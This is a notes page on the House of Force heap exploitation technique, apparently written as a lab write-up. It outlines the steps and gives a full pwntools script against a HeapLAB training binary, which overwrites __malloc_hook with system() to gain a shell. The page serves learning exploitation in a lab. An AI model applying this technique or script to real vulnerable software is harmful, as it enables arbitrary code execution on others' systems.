---
title: "House of Force"
tags: [Binary Exploitation, Heap]
excerpt: "House of Force"
layout: single
classes: wide
--- 

## Requirements
* Control of top chunk size, usually through heap overflow
* Full control of size of allocated chunks

## Process
### Arbitrary Write Primitive
* Overwrite size of top chunk to `0xffffffffffffffff`
* Allocate chunk with size of `offset`, using `malloc()`
    * If `target < top_chunk`: `offset = top_chunk - target + allocated_chunks_size`, and offset is negative
    * If `target > top_chunk`: `offset = target - top_chunk - allocated_chunks_size`
* Allocate new chunk, this chunk will be created at `target`

### Gaining RCE using ret2libc
_This requires libc version to be known_
* Overwrite `__malloc_hook` using write primitive with `system()`
* Call `malloc(/bin/sh)`

## Example: HeapLAB House of Force
```python
from pwn import *

config = {
    "elf" : "./house_of_force",
    "libc" : "./libc-2.28.so",
    "ld" : "./ld.so.2",
}

def malloc(size, data):
    sla('>', '1')
    sla('size:', str(size))
    sla('data:', data)

def exploit(p):
    # Get addresses
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    ru('heap @ ')
    heap_addr = int(p.recvline().strip(), 16)
    
    # Calculate libc_base, etc...
    libc.address = puts - libc.symbols['puts']
    malloc_hook = libc.symbols['__malloc_hook']
    system = libc.symbols['system']
    binsh = libc.search('/bin/sh\x00').next()

    lg('heap_addr: ' + hex(heap_addr))
    lg('malloc_hook: ' + hex(malloc_hook))
    lg('system: ' + hex(system))
    lg('binsh: ' + hex(binsh))
    
    # House of Force: Overwrite top_chunk size
    malloc(24, '/bin/sh\x00'.ljust(24, "\x00") + p64(0xffffffffffffffff))
    
    """
    # Overwrite target with "OVERWRIT"
    target = elf.symbols['target']
    top_chunk = heap_addr + 0x20
    offset = top_chunk - target + 32
    ru('>')
    malloc(-offset, p64(0xdeadbeef))
    malloc(16, 'OVERWRIT')
    sla('>', '2')
    """

    # Pop shell with ret2libc by overwriting __malloc_hook with system() 
    top_chunk = heap_addr + 0x20
    offset = malloc_hook - top_chunk - 32
    ru('>')
    malloc(offset, "Y") 
    malloc(24, p64(system))
    sla('>', '1')
    sla('size:', str(binsh))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = ELF(config["libc"])

    p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```
